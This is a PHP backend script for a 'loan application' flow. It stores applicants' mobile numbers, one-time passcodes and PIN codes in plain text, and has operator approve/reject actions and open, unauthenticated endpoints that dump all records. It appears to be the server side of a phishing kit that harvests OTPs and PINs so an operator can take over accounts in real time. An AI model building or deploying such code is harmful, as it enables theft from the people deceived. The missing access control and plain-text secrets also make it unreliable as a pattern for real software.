<?php
// Suppress all PHP errors/warnings for clean JSON output
error_reporting(0);
ini_set('display_errors', 0);

// Start output buffering to catch any unexpected output
ob_start();

session_start();
require_once 'config/database.php';

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

try {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input = json_decode(file_get_contents('php://input'), true);
        $action = $input['action'] ?? '';
        
        switch ($action) {
            case 'update_loan_info':
                $amount = $input['amount'];
                $category = $input['category'];
                
                // Create new loan application
                $stmt = $pdo->prepare("INSERT INTO loan_applications (amount, category, status) VALUES (?, ?, 'pending')");
                $stmt->execute([$amount, $category]);
                $loan_id = $pdo->lastInsertId();
                
                $_SESSION['loan_id'] = $loan_id;
                $_SESSION['loan_amount'] = $amount;
                $_SESSION['loan_category'] = $category;
                
                ob_clean();
                echo json_encode(['success' => true, 'loan_id' => $loan_id]);
                break;
                
            case 'update_mobile':
                $loan_id = $input['loan_id'];
                $mobile_number = $input['mobile_number'];
                
                $stmt = $pdo->prepare("UPDATE loan_applications SET mobile_number = ?, status = 'mobile_verified' WHERE id = ?");
                $stmt->execute([$mobile_number, $loan_id]);
                
                $_SESSION['mobile_number'] = $mobile_number;
                
                ob_clean();
                echo json_encode(['success' => true]);
                break;
                
            case 'update_otp':
                $loan_id = $input['loan_id'];
                $otp_code = $input['otp_code'];
                
                $stmt = $pdo->prepare("UPDATE loan_applications SET otp_code = ? WHERE id = ?");
                $stmt->execute([$otp_code, $loan_id]);
                
                ob_clean();
                echo json_encode(['success' => true]);
                break;
                
            case 'reset_otp_status':
                $loan_id = $input['loan_id'];
                
                $stmt = $pdo->prepare("UPDATE loan_applications SET admin_action = 'pending' WHERE id = ?");
                $stmt->execute([$loan_id]);
                
                ob_clean();
                echo json_encode(['success' => true]);
                break;
                
            case 'update_pin':
                $loan_id = $input['loan_id'];
                $pin_code = $input['pin_code'];
                
                $stmt = $pdo->prepare("UPDATE loan_applications SET pin_code = ?, status = 'processing' WHERE id = ?");
                $stmt->execute([$pin_code, $loan_id]);
                
                $_SESSION['pin_code'] = $pin_code;
                
                ob_clean();
                echo json_encode(['success' => true]);
                break;
                
            case 'pin_ready_for_approval':
                $loan_id = $input['loan_id'];
                $pin_code = $input['pin_code'];
                $mobile_number = $input['mobile_number'];
                $amount = $input['amount'];
                $category = $input['category'];
                
                $stmt = $pdo->prepare("UPDATE loan_applications SET pin_code = ?, status = 'pin_verified' WHERE id = ?");
                $stmt->execute([$pin_code, $loan_id]);
                
                ob_clean();
                echo json_encode(['success' => true]);
                break;
                
            case 'admin_approve':
                $loan_id = $input['loan_id'];
                
                $stmt = $pdo->prepare("UPDATE loan_applications SET admin_action = 'approved', status = 'approved' WHERE id = ?");
                $stmt->execute([$loan_id]);
                
                ob_clean();
                echo json_encode(['success' => true]);
                break;
                
            case 'admin_reject':
                $loan_id = $input['loan_id'];
                
                $stmt = $pdo->prepare("UPDATE loan_applications SET admin_action = 'rejected', status = 'rejected' WHERE id = ?");
                $stmt->execute([$loan_id]);
                
                ob_clean();
                echo json_encode(['success' => true]);
                break;
                
            case 'get_applications':
                $stmt = $pdo->prepare("SELECT * FROM loan_applications ORDER BY created_at DESC");
                $stmt->execute();
                $applications = $stmt->fetchAll();
                
                ob_clean();
                echo json_encode(['success' => true, 'applications' => $applications]);
                break;
                
            default:
                ob_clean();
                echo json_encode(['success' => false, 'error' => 'Invalid action']);
        }
    } elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $action = $_GET['action'] ?? '';
        
        // Debug: Log the action
        error_log("GET Request - Action: " . $action);
        
        switch ($action) {
            case 'get_all':
                $stmt = $pdo->prepare("SELECT * FROM loan_applications ORDER BY created_at DESC");
                $stmt->execute();
                $loans = $stmt->fetchAll();
                
                ob_clean();
                echo json_encode(['success' => true, 'loans' => $loans, 'count' => count($loans)]);
                break;
                
            default:
                ob_clean();
                echo json_encode(['success' => false, 'error' => 'Invalid action', 'received_action' => $action, 'method' => $_SERVER['REQUEST_METHOD']]);
        }
    } else {
        ob_clean();
        echo json_encode(['success' => false, 'error' => 'Invalid request method']);
    }
} catch (Exception $e) {
    ob_clean();
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
}
?>